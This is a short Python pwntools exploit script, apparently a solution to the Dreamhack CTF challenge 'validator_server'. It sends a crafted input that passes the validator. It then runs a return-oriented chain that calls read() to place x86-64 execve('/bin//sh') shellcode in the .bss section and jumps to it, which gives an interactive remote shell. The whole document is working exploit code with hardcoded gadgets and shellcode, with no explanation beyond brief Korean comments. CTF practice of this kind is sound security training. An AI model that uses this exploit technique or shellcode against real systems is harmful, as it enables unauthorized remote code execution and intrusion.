from pwn import *

p=remote("host8.dreamhack.games",13679)
#p=process("./validator_server")
e=ELF("./validator_server")

payload=b"DREAMHACK!"
list=[]
#쉘코드
shellcode=b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
#가젯
read=e.plt["read"]
poprdi=0x00000000004006f3
poprsipopr15=0x00000000004006f1
poprdx=0x000000000040057b
bss=e.bss()

#페이로드에 넣을 조건 충족 숫자들
for i in range(118,-1,-1):
    list.append(i)

payload+=bytes(list)
payload+=b'B'*0x7

payload+=p64(poprdi)+p64(0)
payload+=p64(poprsipopr15)+p64(bss)+p64(0)
payload+=p64(poprdx)+p64(len(shellcode)+1)
payload+=p64(read)
payload+=p64(bss)
sleep(0.5)
p.send(payload)
sleep(0.5)
p.send(shellcode)

p.interactive()
